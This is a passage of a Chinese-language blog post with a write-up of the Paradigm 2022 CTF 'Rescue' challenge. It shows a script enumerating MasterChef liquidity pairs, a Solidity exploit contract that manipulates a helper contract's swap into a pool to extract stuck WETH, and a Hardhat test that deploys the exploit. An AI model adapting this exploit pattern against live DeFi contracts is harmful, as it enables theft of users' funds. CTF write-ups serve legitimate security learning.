class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"Approval"</span>,<span class="string">"type"</span>:<span class="string">"event"</span>&#125;,&#123;<span class="string">"anonymous"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"from"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">false</span>,<span class="string">"name"</span>:<span class="string">"value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"Transfer"</span>,<span class="string">"type"</span>:<span class="string">"event"</span>&#125;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> contractAddress = <span class="string">"0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> provider = <span class="keyword">await</span> ethers.getDefaultProvider();</span><br><span class="line">        <span class="keyword">const</span> MasterLike = <span class="keyword">new</span> ethers.Contract(contractAddress, abi, provider);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// let pool_info = await MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">            <span class="keyword">let</span> pool_info = <span class="keyword">await</span> MasterLike.poolInfo(i);</span><br><span class="line">            <span class="keyword">let</span> lp_token = pool_info[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">const</span> pair = <span class="keyword">new</span> ethers.Contract(ethers.utils.getAddress(lp_token), UniswapV2pairLikeAbi, provider);</span><br><span class="line">            <span class="keyword">const</span> token0 = <span class="keyword">await</span> pair.token0();</span><br><span class="line">            <span class="keyword">let</span> token1 = <span class="keyword">await</span> pair.token1();</span><br><span class="line">            <span class="keyword">let</span> token_contract0 = <span class="keyword">new</span> ethers.Contract(token0, erc20_abi, provider);</span><br><span class="line">            <span class="keyword">let</span> token_contract1 = <span class="keyword">new</span> ethers.Contract(token1, erc20_abi, provider);</span><br><span class="line">            <span class="keyword">let</span> token0_name = <span class="keyword">await</span> token_contract0.symbol();</span><br><span class="line">            <span class="keyword">let</span> tokne1_name = <span class="keyword">await</span> token_contract1.symbol();</span><br><span class="line">            <span class="comment">// console.log(lp_token)</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`lp_token is : <span class="subst">$&#123;lp_token&#125;</span>  token0 is : <span class="subst">$&#123;token0_name&#125;</span> token1 is : <span class="subst">$&#123;tokne1_name&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// const ExploitFactory = await ethers.getContractFactory("Exploit",attacker);</span></span><br><span class="line">        <span class="comment">// const exploit = await ExploitFactory.deploy(setup.address, &#123;value : ethers.utils.parseEther("50")&#125;);</span></span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><br>获取到的交易对如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pair_id:0,lp_address:0x06da0fd433C1A5d7a4faa01111c044910A184553,token0:WETH,token1:USDT</span><br><span class="line">pair_id:1,lp_address:0x397FF1542f962076d0BFE58eA045FfA2d347ACa0,token0:USDC,token1:WETH</span><br><span class="line">pair_id:2,lp_address:0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f,token0:DAI,token1:WETH</span><br><span class="line">pair_id:3,lp_address:0xF1F85b2C54a2bD284B1cf4141D64fD171Bd85539,token0:sUSD,token1:WETH</span><br><span class="line">pair_id:4,lp_address:0x31503dcb60119A812feE820bb7042752019F2355,token0:COMP,token1:WETH</span><br><span class="line">pair_id:5,lp_address:0x5E63360E891BD60C69445970256C260b0A6A54c6,token0:LEND,token1:WETH</span><br><span class="line">pair_id:6,lp_address:0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470,token0:SNX,token1:WETH</span><br><span class="line">pair_id:7,lp_address:0x001b6450083E531A5a7Bf310BD2c1Af4247E23D4,token0:UMA,token1:WETH</span><br><span class="line">pair_id:8,lp_address:0xC40D16476380e4037e6b1A2594cAF6a6cc8Da967,token0:LINK,token1:WETH</span><br><span class="line">pair_id:9,lp_address:0xA75F7c2F025f470355515482BdE9EFA8153536A8,token0:BAND,token1:WETH</span><br><span class="line">pair_id:10,lp_address:0xCb2286d9471cc185281c4f763d34A962ED212962,token0:WETH,token1:AMPL</span><br><span class="line">pair_id:11,lp_address:0x088ee5007C98a9677165D78dD2109AE4a3D04d0C,token0:YFI,token1:WETH</span><br><span class="line">pair_id:12,lp_address:0x795065dCc9f64b5614C407a6EFDC400DA6221FB0,token0:SUSHI,token1:WETH</span><br><span class="line">pair_id:13,lp_address:0x611CDe65deA90918c0078ac0400A72B0D25B9bb1,token0:REN,token1:WETH</span><br><span class="line">pair_id:14,lp_address:0xaAD22f5543FCDaA694B68f94Be177B561836AE57,token0:sUSD,token1:$BASED</span><br><span class="line">pair_id:15,lp_address:0x117d4288B3635021a3D612FE05a3Cbf5C717fEf2,token0:SRM,token1:WETH</span><br><span class="line">pair_id:16,lp_address:0x95b54C8Da12BB23F7A5F6E26C38D04aCC6F81820,token0:YAMv2,token1:WETH</span><br><span class="line">pair_id:17,lp_address:0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009,token0:WETH,token1:CRV</span><br><span class="line">pair_id:18,lp_address:0xDafd66636E2561b0284EDdE37e42d192F2844D40,token0:UNI,token1:WETH</span><br><span class="line">pair_id:19,lp_address:0x36e2FCCCc59e5747Ff63a03ea2e5C0c2C14911e7,token0:xSUSHI,token1:WETH</span><br></pre></td></tr></table></figure></p>
+<p>我们可以写出以下攻击合约：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;UniswapV2Like.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;Setup.sol&quot;; </span><br><span class="line">import &quot;.&#x2F;MasterChefHelper.sol&quot;;</span><br><span class="line">contract Exploit&#123;</span><br><span class="line">    </span><br><span class="line">    constructor(Setup setup) payable &#123;</span><br><span class="line"></span><br><span class="line">        WETH9 weth &#x3D; setup.weth();</span><br><span class="line">		MasterChefHelper mcHelper &#x3D; setup.mcHelper();</span><br><span class="line">        UniswapV2RouterLike router &#x3D; UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line">        address usdc &#x3D; 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;</span><br><span class="line">        address dai &#x3D; 0x6B175474E89094C44Da98b954EedeAC495271d0F;</span><br><span class="line">		weth.approve(address(router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">		weth.deposit&#123;value: 40 ether&#125;();</span><br><span class="line"></span><br><span class="line">		address[] memory path &#x3D; new address[](2);</span><br><span class="line"></span><br><span class="line">		path[0] &#x3D; address(weth);</span><br><span class="line">		path[1] &#x3D; usdc;</span><br><span class="line">		router.swapExactTokensForTokens(</span><br><span class="line">			11 ether,</span><br><span class="line">			0,</span><br><span class="line">			path,</span><br><span class="line">			address(mcHelper),</span><br><span class="line">			block.timestamp</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		path[0] &#x3D; address(weth);</span><br><span class="line">		path[1] &#x3D; dai;</span><br><span class="line">		router.swapExactTokensForTokens(</span><br><span class="line">			9 ether,</span><br><span class="line">			0,</span><br><span class="line">			path,</span><br><span class="line">			address(this),</span><br><span class="line">			block.timestamp</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		uint256 daiIn &#x3D; 50 * 10 ** 18;								</span><br><span class="line">		ERC20Like(dai).approve(address(mcHelper), type(uint256).max);</span><br><span class="line">		mcHelper.swapTokenForPoolToken(1, dai, daiIn, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里先用11个ETH去交换usdc,交换得到的usdc发送到<code>mcHelper</code>合约,这里的11个ETH其实只要大于10即可,目的是为了将<code>mcHelper</code>里的WETH全部加到流动性池子里.也可以通过<code>getAmountOut</code>函数计算处需要传入的usdc数目。<br>然后我换一些dai到自己合约,以便于触发<code>mcHelper</code>的<code>swapTokenForPoolToken()</code>函数</p>
+<p>js测试代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"><span class="keyword">const</span> masterLike = <span class="built_in">require</span>(<span class="string">'../contracts/rescue/MatserChefLike.json'</span>)</span><br><span class="line">describe(<span class="string">"Challange rescue"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> Weth = <span class="keyword">await</span> ethers.getContractAt(<span class="string">"WETH9"</span>,<span class="string">"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Setup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"50"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line">        <span class="comment">// let abi = [&#123;"inputs":[&#123;"internalType":"uint256","name":"id","type":"uint256"&#125;],"name":"poolInfo","outputs":[&#123;"internalType":"address","name":"lpToken","type":"address"&#125;,&#123;"internalType":"uint256","name":"allocPoint","type":"uint256"&#125;,&#123;"internalType":"uint256","name":"lastRewardBlock","type":"uint256"&#125;,&#123;"internalType":"uint256","name":"accSushiPerShare","type":"uint256"&#125;],"stateMutability":"nonpayable","type":"function"&#125;];</span></span><br><span class="line">        <span class="comment">// let contractAddress = "0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd";</span></span><br><span class="line">        <span class="comment">// let provider = await ethers.getDefaultProvider();</span></span><br><span class="line">        <span class="comment">// const MasterLike = new ethers.Contract(contractAddress, abi, provider);</span></span><br><span class="line">        <span class="comment">// // const MasterLike = await ethers.getContractAt("MasterChefLike","0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd", deployer);</span></span><br><span class="line">        <span class="comment">// for(let i = 0; i &lt; 5; i++)&#123;</span></span><br><span class="line">        <span class="comment">//     let tx = await MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">        <span class="comment">//     let pool_info = await tx.wait();</span></span><br><span class="line">        <span class="comment">//     // let pool_info = MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">        <span class="comment">//     // let lp_token = tx[i];</span></span><br><span class="line">        <span class="comment">//     // console.log(pool_info);</span></span><br><span class="line">        <span class="comment">//     console.log(tx);</span></span><br><span class="line">        <span class="comment">//     console.log(pool_info);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ExploitFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Exploit"</span>,attacker);</span><br><span class="line">        <span class="keyword">const</span> exploit = <span class="keyword">await</span> ExploitFactory.deploy(setup.address, &#123;<span class="attr">value</span> : ethers.utils.parseEther(<span class="string">"50"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/paradigm22-merkleDrop/" data-toggle="tooltip" data-placement="top" title="Paradigm 题解 MerkleDrop">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/uniswap-v3/" data-toggle="tooltip" data-placement="top" title="Uniswap_V3 源码分析">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/music-player/utill.js"></script>
+
+
+<script src="/js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="/js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#paradigm-2022-ctf-题解——Rescue"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">paradigm 2022 ctf 题解——Rescue</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Resucue"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">Resucue</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exploit"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Exploit</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Paradigm" title="Paradigm">Paradigm</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2022 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://dusign.net/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🌱&#34;,&#34;just do it&#34;,&#34;🍀&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
